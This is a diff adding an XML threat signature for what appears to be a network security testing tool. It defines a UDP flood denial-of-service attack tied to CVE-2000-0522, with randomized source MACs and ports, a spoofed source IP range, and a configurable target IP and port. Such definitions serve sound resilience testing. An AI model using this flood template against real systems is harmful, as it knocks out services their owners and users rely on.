@@ -1,0 +1,75 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="UDP Service Flood" />
+    <EngDesc display="true" value="A very basic form of attack that can easily cause a DoS on most equipment. Sends out UDP traffic from random traffic sources. The UDP flood can DoS in two ways: 1) Saturates the queue of a device with connectionless UDP traffic, preventing legitimate connection oriented traffic to pass through. 2) This threat allows the user to adjust the target IP and port, possibly causing a DoS on the targets service or host operating system." />
+    <Intent display="true">
+      <item value="Crashing" />
+      <item value="Denial_of_Service" />
+    </Intent>
+    <Protocol display="true" value="UDP" />
+    <Type_Of_Equipment display="true">
+      <item value="Protocol" />
+    </Type_Of_Equipment>
+    <Severity display="true" value="" />
+    <Known_Vendors_Affected display="true">
+      <item value="All" />
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Transport_Layer" />
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="ALL" />
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.attrition.org/security/denial/w/cisc2500.dos.html" />
+    <CVEID display="true" value="CVE-2000-0522" />
+    <bugtraqID display="true" value="1332" />
+    <OSVDB display="true" value="1393" />
+    <Author display="true" value="Chuck McAuley" />
+    <ID display="true" value="000000ff464dba1500a900fe009b00c95a04fde1" />
+    <Revision display="true" value="9" />
+    <Safe display="true" value="" />
+    <ServerSideAttack display="true" value="false" />
+    <SoftwareRevision display="true" value="1.4" />
+    <Suite display="true" value="Standard" />
+    <RunOnce display="false" value="" />
+    <Valid_Traffic display="false" value="" />
+    <AccessVector display="false" value="remote" />
+    <AccessComplexity display="false" value="low" />
+    <Authentication display="false" value="not-required" />
+    <ConfImpact display="false" value="none" />
+    <IntegImpact display="false" value="none" />
+    <AvailImpact display="false" value="partial" />
+    <ImpactBias display="false" value="normal" />
+    <FirstAdded display="false" value="" />
+    <LastModified display="false" value="637631785424947269" />
+    <SigStyle display="false" value="Flood" />
+    <targetNode display="false" value="A" />
+    <SigProtocol display="false" value="UDP" />
+    <Rate display="false" value="5" />
+    <Regex display="false" value="" />
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B" />
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C" />
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="D" />
+    <NamedVar name="payload" type="ImperfectControls.Payload" value="null" index="E" />
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B" />
+      <for index="C" />
+      <for index="D" />
+      <for index="E" />
+      <for index="F" range="srcIP" />
+    </for>
+  </Loops>
+  <PostScript />
+  <Output index="A" Count="1">
+    <Ethernet srcMac="@random(00:00:00:00:00:00,FF:FF:FF:FF:FF:FF)" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="0" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="0" TTL="FF" Protocol="11" HeaderChecksum="" srcIP="@range(30.157.245.12,30.157.245.14)" destIP="$destIP" options="" CE="false" DF="false" MF="false">
+        <UDP srcPort="@random(0,65535)" destPort="$destPort" checksum="" length="" Payload="$payload" />
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
